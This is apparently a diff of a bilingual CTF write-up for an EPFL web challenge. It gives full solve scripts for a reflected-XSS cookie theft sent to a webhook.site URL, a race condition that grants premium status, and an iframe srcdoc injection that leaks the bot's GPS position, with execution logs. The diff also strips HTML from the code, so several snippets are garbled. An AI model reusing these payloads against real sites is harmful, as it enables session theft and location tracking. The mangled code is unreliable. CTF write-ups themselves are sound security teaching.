@@ -11,7 +11,8 @@ This is NOT an OSINT challenge 🙂 (PS: please have a working exploit locally b
 
 这不是 OSINT 挑战:)（PS：在销毁遥控器🙏之前，请在本地有一个有效的漏洞利用）
 
-URL: https://chall.polygl0ts.ch:9011
+URL: https://chall.polygl0ts.ch:
+9011
 
 Source code of the challenge: handout.tar.gz
 
@@ -63,15 +64,21 @@ Details based on deltaclock’s solution.
 
 Reflected XSS: 反射型 XSS：
 
-The challenge is running on chall.polygl0ts.ch:9011, however there is a reflected XSS vulnerability in another challenge located on the same domain but a different port chall.polygl0ts.ch:9009.
+The challenge is running on chall.polygl0ts.ch:
+9011, however there is a reflected XSS vulnerability in another challenge located on the same domain but a different port chall.polygl0ts.ch:
+9009.
 
-质询正在运行 chall.polygl0ts.ch:9011 ，但是在位于同一域但不同端口 chall.polygl0ts.ch:9009 的另一个质询中存在反映的 XSS 漏洞。
+质询正在运行 chall.polygl0ts.ch:
+9011 ，但是在位于同一域但不同端口 chall.polygl0ts.ch:
+9009 的另一个质询中存在反映的 XSS 漏洞。
 
 The reflected XSS on the second web challenge allows us to access and steal the cookies of the current challenge which do not have a simple reflected XSS.
 
 第二个 Web 挑战上的反射 XSS 允许我们访问和窃取当前挑战的 cookie，这些 cookie 没有简单的反射 XSS。
 
-http://%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E:pass@chall.polygl0ts.ch:9009
+http://%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E:
+pass@chall.polygl0ts.ch:
+9009
 
 Keep in mind this XSS, we will use it later.
 
@@ -176,9 +183,9 @@ router.post('/challengeUser', async (req, res) => {
  chall = await db.getChallengeById(req.body["duelID"].toString())
  if (!chall)
  return res.status(401).json('huh?');
- 
+
  // user.username contains the HTML injection
- db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! <a href="/challenge?id=${chall.id}">Click here to play!</a>`)
+ db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! [Click here to play!](/challenge?id=${chall.id})`)
  return res.status(200).json('yes ok');
  }
  }
@@ -240,7 +247,9 @@ We can chain this bot redirection with the previous reflected XSS vulnerability 
 WEBHOOK = "https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6"
 
 REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cookie))</script>")
-XSS_STEAL_TOKEN = f'<a href="http://{REFLECTED_XSS}:pass@chall.polygl0ts.ch:9009/">Click here to play!</a>'
+XSS_STEAL_TOKEN = f'[Click here to play!](http://{REFLECTED_XSS}:
+pass@chall.polygl0ts.ch:
+9009/)'
 
 def leak_admin_token():
  """
@@ -283,14 +292,16 @@ Script execution output:
 11
 
 [20ecddd2690b291bba96c5d49432166c] Registered as: RoughHurt2208
-[20ecddd2690b291bba96c5d49432166c] Username updated to: <a href="http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:pass@chall.polygl0ts.ch:9009/">Click here to play!</a>
+[20ecddd2690b291bba96c5d49432166c] Username updated to: [Click here to play!](http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:
+pass@chall.polygl0ts.ch:
+9009/)
 [20ecddd2690b291bba96c5d49432166c] Challenge '0fb579eb211d294eba586d80fce5aadf' created with OpenLayersVersion:
 [2995247d09fecd4f7bb3889d9c992799] Registered as: VigorousBoard1479
 [2995247d09fecd4f7bb3889d9c992799] Bot send an invitation to: VigorousBoard1479
 [2995247d09fecd4f7bb3889d9c992799] Connecting to socket.io...
 [2995247d09fecd4f7bb3889d9c992799] Received: ['status', 'authSuccess']
 [2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', []]
-[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! <a href="/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff">Click here to play!</a>']]
+[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! [Click here to play!](/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff)']]
 [2995247d09fecd4f7bb3889d9c992799] Received a game request from 'FrenchSize8523' for challenge '4d6ca7d6e29aadd2eade7f8f82fefdff'.
 [20ecddd2690b291bba96c5d49432166c] Challenge sent to: FrenchSize8523
 
@@ -444,7 +455,7 @@ def register_and_check():
 def obtain_premium_user():
  """
  Obtain a premium user.
- 
+
  1. Register a user and ask the bot to send an invitation to itself.
  2. Register multiple users in parallel to exploit a race condition between 'updateUser' and 'register'.
  3. Check if one of the user is premium.
@@ -462,7 +473,7 @@ def obtain_premium_user():
  threads.append(thread)
  thread.start()
  sleep(0.05)
- 
+
  for thread in threads:
  thread.join()
 
@@ -555,9 +566,11 @@ Utilize Chrome’s Backward/Forward cache (bfcache) to return to the settings pa
 
 利用 Chrome 的后退/前进缓存 （ bfcache ） 返回设置页面，输入表单中仍存在高级 PIN。
 
-Modify the opener URL using a Text Fragment (e.g., https://example.com#:~:text=[prefix-,]textStart[,textEnd][,-suffix]) to search for the PIN within the page content.
+Modify the opener URL using a Text Fragment (e.g., https://example.com#:~:
+text=[prefix-,]textStart[,textEnd][,-suffix]) to search for the PIN within the page content.
 
-使用文本片段（例如， https://example.com#:~:text=[prefix-,]textStart[,textEnd][,-suffix] ）修改打开程序 URL，以在页面内容中搜索 PIN。
+使用文本片段（例如， https://example.com#:~:
+text=[prefix-,]textStart[,textEnd][,-suffix] ）修改打开程序 URL，以在页面内容中搜索 PIN。
 
 Before changing the opener URL, send a notification to the bot containing the numbers of the PIN you wish to find, and attach a loading lazy image pointing to your webhook.
 
@@ -607,7 +620,7 @@ router.post('/createChallenge', async (req, res) => {
  token = req.cookies["token"]
  if (token) {
  user = await db.getUserBy("token", token)
- 
+
  if (user && req.body["longitude"] && req.body["latitude"] && req.body["img"]) {
  chalId = crypto.randomBytes(16).toString('hex')
  if (user.isPremium) {
@@ -659,7 +672,7 @@ router.get('/challenge', async (req, res) => {
  chall = await db.getChallengeById(req.query.id.toString())
  if (!chall)
  return res.status(404).json('no');
- 
+
  libVersion = chall.OpenLayersVersion
  img = chall.image
  challId = chall.id
@@ -676,10 +689,10 @@ Challenge EJS page: 挑战 EJS 页面：
 3
 4
 
-<div id="challId"><%= challId %></div>
-<img src="data:image/png;base64,<%= img %>">
-<iframe <%- iframeAttributes %>></iframe>
-<button id="submitButton">Submit position</button>
+<%= challId %>
+">
+>
+Submit position
 
 As saw early, we can create a challenge and define the value of OpenLayersVersion. The sanitizeHTMLprevents us to escape the iframe tag, however we can add attributes to the HTML tag. Attributes such as onload or onclick are restricted by the Content-Security Policy (CSP). Nevertheless, the srcdoc attribute can be utilized, which supersedes the already defined src attribute. We can also add the geolocation to the sandbox attribute to be able to leak the GPS coordinates of the bot.
 
@@ -695,11 +708,8 @@ Within the srcdoc attribute, &#60; can be utilized in place of <, this will
 4
 5
 
-<iframe sandbox="allow-scripts allow-same-origin"
- src="/sandboxedChallenge?ver="
- srcdoc="&#60;meta http-equiv=\'refresh\' content=\'1; url={WEBHOOK}\'&#62;"
- allow="geolocation {WEBHOOK}" x="" width="70%" height="97%">
-</iframe>
+
+
 
 Here’s the content of my XSS inside my webhook to steal the bot’s coordinates:
 
@@ -713,13 +723,13 @@ Here’s the content of my XSS inside my webhook to steal the bot’s coordinate
 6
 7
 
-<body>
+
  <script>
  navigator.geolocation.getCurrentPosition((pos) => {
  fetch(`https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
  });
  </script>
-</body>
+
 
 Here’s my solve script for this part:
 
@@ -788,7 +798,7 @@ Here’s the output: 输出如下：
 [c941e1b04bd79d753359b57c09e36b6c] Connecting to socket.io...
 [c941e1b04bd79d753359b57c09e36b6c] Received: ['status', 'authSuccess']
 [c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', []]
-[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! <a href="/challenge?id=766ec00653beea3a2aa116a4f992f6e0">Click here to play!</a>']]
+[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! [Click here to play!](/challenge?id=766ec00653beea3a2aa116a4f992f6e0)']]
 [c941e1b04bd79d753359b57c09e36b6c] Received a game request from 'DistortedSlice3492' for challenge '766ec00653beea3a2aa116a4f992f6e0'.
 [823fa49e380846156a4e78cd3ba6c346] Challenge sent to: DistortedSlice3492
 
@@ -845,7 +855,7 @@ Execution of the script:
 [43ea8c0e81990644f9b7e30a12ddc2ec] Connecting to socket.io...
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['status', 'authSuccess']
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', []]
-[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! <a href="/challenge?id=2fb16891fce844d41eab9df526abc1c6">Click here to play!</a>']]
+[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! [Click here to play!](/challenge?id=2fb16891fce844d41eab9df526abc1c6)']]
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received a game request from 'DirtyPeople3320' for challenge '2fb16891fce844d41eab9df526abc1c6'.
 [43ea8c0e81990644f9b7e30a12ddc2ec] Challenge '2fb16891fce844d41eab9df526abc1c6' solved with latitude: 60.792937 and longitude: 11.100984
 flag = 'EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}'
@@ -965,8 +975,10 @@ import secrets
 import requests
 import socketio # python3 -m pip install "python-socketio[client]"
 
-URL = "https://chall.polygl0ts.ch:9011"
-URL = "http://localhost:9011"
+URL = "https://chall.polygl0ts.ch:
+9011"
+URL = "http://localhost:
+9011"
 
 class User:
 
@@ -982,13 +994,13 @@ class User:
  def check_premium(self):
  """Check if the user is premium."""
  html = self.sess.get(URL).text
- return '<div id="isPremium">1</div>' in html
+ return '1' in html
 
  def register(self):
  """Register a user on the application."""
  html = self.sess.get(URL + "/register").text
- self.username = html.split('<b id="username">')[1].split("</b>")[0]
- self.token = html.split('<b id="token">')[1].split("</b>")[0]
+ self.username = html.split('')[1].split("")[0]
+ self.token = html.split('')[1].split("")[0]
  print(f"[{self.token}] Registered as: {self.username}")
 
  def change_username(self, new_username):
@@ -1026,7 +1038,7 @@ class User:
  data = sio.receive()
  if data[1] == "auth":
  sio.emit("auth", self.token)
- 
+
  while True:
  data = sio.receive()
  print(f"[{self.token}] Received: {data}")
@@ -1050,7 +1062,7 @@ class User:
  challenge_id = resp.text.strip('"')
  print(f"[{self.token}] Challenge '{challenge_id}' created with OpenLayersVersion: {OpenLayersVersion}")
  return challenge_id
- 
+
  def solve_challenge(self, challenge_id, latitude, longitude):
  """Solve a challenge."""
  resp = self.sess.post(URL + "/solveChallenge", json={
@@ -1068,21 +1080,11 @@ class User:
 3
 4
 5
-```
-
-
-
-```
 router.get("/bot", limiter, async (req, res) => {
  if (!req.query.username) return res.status(404).json('what are you even doing lol')
  botChallenge(req.query.username.toString(),premiumPin)
  return res.status(200).json('successfully received :)');
 });
-```
-
-
-
-```
 1
  2
  3
@@ -1095,11 +1097,6 @@ router.get("/bot", limiter, async (req, res) => {
 10
 11
 12
-```
-
-
-
-```
 async function play(page) { // admin accepts all challenges :)
  while (true) {
  try {
@@ -1112,11 +1109,6 @@ async function play(page) { // admin accepts all challenges :)
  }
  }
 }
-```
-
-
-
-```
 1
  2
  3
@@ -1138,11 +1130,6 @@ async function play(page) { // admin accepts all challenges :)
 19
 20
 21
-```
-
-
-
-```
 router.post('/challengeUser', async (req, res) => {
  token = req.cookies["token"]
  if (token) {
@@ -1156,37 +1143,22 @@ router.post('/challengeUser', async (req, res) => {
  chall = await db.getChallengeById(req.body["duelID"].toString())
  if (!chall)
  return res.status(401).json('huh?');
- 
+
  // user.username contains the HTML injection
- db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! <a href="/challenge?id=${chall.id}">Click here to play!</a>`)
+ db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! [Click here to play!](/challenge?id=${chall.id})`)
  return res.status(200).json('yes ok');
  }
  }
  return res.status(401).json('no');
 });
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 socket.on("notifications", (data) => {
  // ...
  notificationsList.innerHTML = DOMPurify.sanitize(notifHTML);
 });
-```
-
-
-
-```
 1
  2
  3
@@ -1216,15 +1188,12 @@ socket.on("notifications", (data) => {
 27
 28
 29
-```
-
-
-
-```
 WEBHOOK = "https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6"
 
 REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cookie))</script>")
-XSS_STEAL_TOKEN = f'<a href="http://{REFLECTED_XSS}:pass@chall.polygl0ts.ch:9009/">Click here to play!</a>'
+XSS_STEAL_TOKEN = f'[Click here to play!](http://{REFLECTED_XSS}:
+pass@chall.polygl0ts.ch:
+9009/)'
 
 def leak_admin_token():
  """
@@ -1249,11 +1218,6 @@ def leak_admin_token():
 
 leak_admin_token()
 # https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6?token=9d31e6fb14d02f0cf646c230b650cd8a
-```
-
-
-
-```
 1
  2
  3
@@ -1265,27 +1229,19 @@ leak_admin_token()
  9
 10
 11
-```
-
-
-
-```
 [20ecddd2690b291bba96c5d49432166c] Registered as: RoughHurt2208
-[20ecddd2690b291bba96c5d49432166c] Username updated to: <a href="http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:pass@chall.polygl0ts.ch:9009/">Click here to play!</a>
+[20ecddd2690b291bba96c5d49432166c] Username updated to: [Click here to play!](http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:
+pass@chall.polygl0ts.ch:
+9009/)
 [20ecddd2690b291bba96c5d49432166c] Challenge '0fb579eb211d294eba586d80fce5aadf' created with OpenLayersVersion:
 [2995247d09fecd4f7bb3889d9c992799] Registered as: VigorousBoard1479
 [2995247d09fecd4f7bb3889d9c992799] Bot send an invitation to: VigorousBoard1479
 [2995247d09fecd4f7bb3889d9c992799] Connecting to socket.io...
 [2995247d09fecd4f7bb3889d9c992799] Received: ['status', 'authSuccess']
 [2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', []]
-[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! <a href="/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff">Click here to play!</a>']]
+[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! [Click here to play!](/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff)']]
 [2995247d09fecd4f7bb3889d9c992799] Received a game request from 'FrenchSize8523' for challenge '4d6ca7d6e29aadd2eade7f8f82fefdff'.
 [20ecddd2690b291bba96c5d49432166c] Challenge sent to: FrenchSize8523
-```
-
-
-
-```
 1
  2
  3
@@ -1318,11 +1274,6 @@ leak_admin_token()
 30
 31
 32
-```
-
-
-
-```
 router.get('/', async (req, res) => {
  user = await db.getUserBy("token", req.cookies?.token)
  // ...
@@ -1355,11 +1306,6 @@ router.post('/updateUser', async (req, res) => {
  }
  return res.status(401).json('no');
 });
-```
-
-
-
-```
 1
  2
  3
@@ -1406,11 +1352,6 @@ router.post('/updateUser', async (req, res) => {
 44
 45
 46
-```
-
-
-
-```
 import threading
 import sys
 from time import sleep
@@ -1432,7 +1373,7 @@ def register_and_check():
 def obtain_premium_user():
  """
  Obtain a premium user.
- 
+
  1. Register a user and ask the bot to send an invitation to itself.
  2. Register multiple users in parallel to exploit a race condition between 'updateUser' and 'register'.
  3. Check if one of the user is premium.
@@ -1450,17 +1391,12 @@ def obtain_premium_user():
  threads.append(thread)
  thread.start()
  sleep(0.05)
- 
+
  for thread in threads:
  thread.join()
 
 if __name__ == "__main__":
  obtain_premium_user()
-```
-
-
-
-```
 1
  2
  3
@@ -1489,11 +1425,6 @@ if __name__ == "__main__":
 26
 27
 28
-```
-
-
-
-```
 $ python3 workflow_race.py
 [068ec97e07f77a7fc421d30f2ba5caec] Registered as: IgnorantArt4455
 [068ec97e07f77a7fc421d30f2ba5caec] Bot send an invitation to: IgnorantArt4455
@@ -1522,11 +1453,6 @@ $ python3 workflow_race.py
 [c8c4e0b2283ce5d90ea65de0f39d9310] Registered as: FineSignificance2232
 [f4b0cb37bb77271f61e64ea9b5e6e2df] CapitalGrade3691 is not premium :(
 [ca99279ac37efc688846ae3e0098779f] Premium user found: ClumsyBet6554 !!!!!!!!!!!!!!!!!!!!!!
-```
-
-
-
-```
 1
  2
  3
@@ -1550,16 +1476,11 @@ $ python3 workflow_race.py
 21
 22
 23
-```
-
-
-
-```
 router.post('/createChallenge', async (req, res) => {
  token = req.cookies["token"]
  if (token) {
  user = await db.getUserBy("token", token)
- 
+
  if (user && req.body["longitude"] && req.body["latitude"] && req.body["img"]) {
  chalId = crypto.randomBytes(16).toString('hex')
  if (user.isPremium) {
@@ -1578,11 +1499,6 @@ router.post('/createChallenge', async (req, res) => {
  }
  return res.status(401).json('no');
 });
-```
-
-
-
-```
 1
  2
  3
@@ -1601,11 +1517,6 @@ router.post('/createChallenge', async (req, res) => {
 16
 17
 18
-```
-
-
-
-```
 sanitizeHTML = (input) => input.replaceAll("<","&lt;").replaceAll(">","&gt;")
 
 router.get('/challenge', async (req, res) => {
@@ -1615,7 +1526,7 @@ router.get('/challenge', async (req, res) => {
  chall = await db.getChallengeById(req.query.id.toString())
  if (!chall)
  return res.status(404).json('no');
- 
+
  libVersion = chall.OpenLayersVersion
  img = chall.image
  challId = chall.id
@@ -1624,49 +1535,21 @@ router.get('/challenge', async (req, res) => {
  iframeAttributes += "width=\"70%\" height=\"97%\" "
  res.render('challenge', {img, challId, iframeAttributes});
 });
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
-<div id="challId"><%= challId %></div>
-<img src="data:image/png;base64,<%= img %>">
-<iframe <%- iframeAttributes %>></iframe>
-<button id="submitButton">Submit position</button>
-```
-
-
-
-```
+<%= challId %>
+">
+>
+Submit position
 1
 2
 3
 4
 5
-```
 
 
-
-```
-<iframe sandbox="allow-scripts allow-same-origin"
- src="/sandboxedChallenge?ver="
- srcdoc="&#60;meta http-equiv=\'refresh\' content=\'1; url={WEBHOOK}\'&#62;"
- allow="geolocation {WEBHOOK}" x="" width="70%" height="97%">
-</iframe>
-```
-
-
-
-```
 1
 2
 3
@@ -1674,23 +1557,13 @@ router.get('/challenge', async (req, res) => {
 5
 6
 7
-```
 
-
-
-```
-<body>
  <script>
  navigator.geolocation.getCurrentPosition((pos) => {
  fetch(`https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
  });
  </script>
-</body>
-```
 
-
-
-```
 1
  2
  3
@@ -1713,11 +1586,6 @@ router.get('/challenge', async (req, res) => {
 20
 21
 22
-```
-
-
-
-```
 XSS_STEAL_COORDS = f'" srcdoc="&#60;meta http-equiv=\'refresh\' content=\'1; url={WEBHOOK}\'&#62;" allow="geolocation {WEBHOOK}" x="'
 
 def leak_admin_gps(admin_token):
@@ -1739,11 +1607,6 @@ def leak_admin_gps(admin_token):
 
 leak_admin_gps(admin_token="9d31e6fb14d02f0cf646c230b650cd8a")
 # https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=60.792937&lon=11.100984
-```
-
-
-
-```
 1
 2
 3
@@ -1753,25 +1616,15 @@ leak_admin_gps(admin_token="9d31e6fb14d02f0cf646c230b650cd8a")
 7
 8
 9
-```
-
-
-
-```
 [823fa49e380846156a4e78cd3ba6c346] Challenge 'c556bfaa3e57e8234aff4fe559de1d49' created with OpenLayersVersion: " srcdoc="&#60;meta http-equiv='refresh' content='1; url=https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6'&#62;" allow="geolocation https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6" x="
 [c941e1b04bd79d753359b57c09e36b6c] Registered as: SpiritedApartment9854
 [c941e1b04bd79d753359b57c09e36b6c] Bot send an invitation to: SpiritedApartment9854
 [c941e1b04bd79d753359b57c09e36b6c] Connecting to socket.io...
 [c941e1b04bd79d753359b57c09e36b6c] Received: ['status', 'authSuccess']
 [c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', []]
-[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! <a href="/challenge?id=766ec00653beea3a2aa116a4f992f6e0">Click here to play!</a>']]
+[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! [Click here to play!](/challenge?id=766ec00653beea3a2aa116a4f992f6e0)']]
 [c941e1b04bd79d753359b57c09e36b6c] Received a game request from 'DistortedSlice3492' for challenge '766ec00653beea3a2aa116a4f992f6e0'.
 [823fa49e380846156a4e78cd3ba6c346] Challenge sent to: DistortedSlice3492
-```
-
-
-
-```
 1
  2
  3
@@ -1784,11 +1637,6 @@ leak_admin_gps(admin_token="9d31e6fb14d02f0cf646c230b650cd8a")
 10
 11
 12
-```
-
-
-
-```
 def get_flag(latitude, longitude):
  """Get the flag by solving a challenge with the admin GPS location."""
  win_user = User()
@@ -1801,11 +1649,6 @@ def get_flag(latitude, longitude):
 
 get_flag(latitude="60.792937", longitude="11.100984")
 # EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}
-```
-
-
-
-```
 1
 2
 3
@@ -1815,25 +1658,15 @@ get_flag(latitude="60.792937", longitude="11.100984")
 7
 8
 9
-```
-
-
-
-```
 [43ea8c0e81990644f9b7e30a12ddc2ec] Registered as: UnpleasantWinner2868
 [43ea8c0e81990644f9b7e30a12ddc2ec] Bot send an invitation to: UnpleasantWinner2868
 [43ea8c0e81990644f9b7e30a12ddc2ec] Connecting to socket.io...
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['status', 'authSuccess']
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', []]
-[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! <a href="/challenge?id=2fb16891fce844d41eab9df526abc1c6">Click here to play!</a>']]
+[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! [Click here to play!](/challenge?id=2fb16891fce844d41eab9df526abc1c6)']]
 [43ea8c0e81990644f9b7e30a12ddc2ec] Received a game request from 'DirtyPeople3320' for challenge '2fb16891fce844d41eab9df526abc1c6'.
 [43ea8c0e81990644f9b7e30a12ddc2ec] Challenge '2fb16891fce844d41eab9df526abc1c6' solved with latitude: 60.792937 and longitude: 11.100984
 flag = 'EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}'
-```
-
-
-
-```
 1
  2
  3
@@ -1935,18 +1768,15 @@ flag = 'EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773
  99
 100
 101
-```
-
-
-
-```
 import secrets
 
 import requests
 import socketio # python3 -m pip install "python-socketio[client]"
 
-URL = "https://chall.polygl0ts.ch:9011"
-URL = "http://localhost:9011"
+URL = "https://chall.polygl0ts.ch:
+9011"
+URL = "http://localhost:
+9011"
 
 class User:
 
@@ -1962,13 +1792,13 @@ class User:
  def check_premium(self):
  """Check if the user is premium."""
  html = self.sess.get(URL).text
- return '<div id="isPremium">1</div>' in html
+ return '1' in html
 
  def register(self):
  """Register a user on the application."""
  html = self.sess.get(URL + "/register").text
- self.username = html.split('<b id="username">')[1].split("</b>")[0]
- self.token = html.split('<b id="token">')[1].split("</b>")[0]
+ self.username = html.split('')[1].split("")[0]
+ self.token = html.split('')[1].split("")[0]
  print(f"[{self.token}] Registered as: {self.username}")
 
  def change_username(self, new_username):
@@ -2006,7 +1836,7 @@ class User:
  data = sio.receive()
  if data[1] == "auth":
  sio.emit("auth", self.token)
- 
+
  while True:
  data = sio.receive()
  print(f"[{self.token}] Received: {data}")
@@ -2030,7 +1860,7 @@ class User:
  challenge_id = resp.text.strip('"')
  print(f"[{self.token}] Challenge '{challenge_id}' created with OpenLayersVersion: {OpenLayersVersion}")
  return challenge_id
- 
+
  def solve_challenge(self, challenge_id, latitude, longitude):
  """Solve a challenge."""
  resp = self.sess.post(URL + "/solveChallenge", json={
